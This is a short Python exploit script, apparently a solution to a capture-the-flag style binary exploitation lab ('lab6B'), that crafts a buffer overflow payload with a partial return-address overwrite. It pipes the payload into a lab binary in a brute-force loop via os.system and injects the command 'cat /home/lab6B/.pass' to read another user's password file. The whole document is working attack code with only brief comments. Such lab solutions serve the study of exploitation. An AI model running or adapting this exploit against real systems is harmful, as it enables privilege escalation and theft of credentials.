# lab6B:p4rti4l_0verwr1tes_r_3nuff

import os

def main():

  evil_bytes = [ "\x07", "\x17", "\x27", "\x37",
                 "\x47", "\x57", "\x67", "\x77",
                 "\x87", "\x97", "\xa7", "\xb7",
                 "\xc7", "\xd7", "\xe7", "\xf7" ]


  # undefined local_c4 is 140 bytes, and we write at offset 140
  # meaning we need to write our "integer" at offset 40.
  int_offset = 40

  static_buffer  = ("\x20" * int_offset)
  static_buffer += ("\xc6\x01\x01\x01")# *(size_t *)(param_1 + 0xb4) = 0xff
  static_buffer += ("%s\n" % ("\x42" * (126-(int_offset+4))))

  static_buffer += "\x20" * 60             # offset to system command
  command        = "cat /home/lab6B/.pass" # command
  static_buffer += command
  static_buffer += "\x20" * (136 - len(command))


  for i in range(16):
    for i in range(len(evil_bytes)):

      ret_addr = ("\x2B%s\xFF" % (evil_bytes[i]))

      cmd = 'echo "%s%s" | ./lab6C' % (static_buffer, ret_addr)
      os.system(cmd)

main()
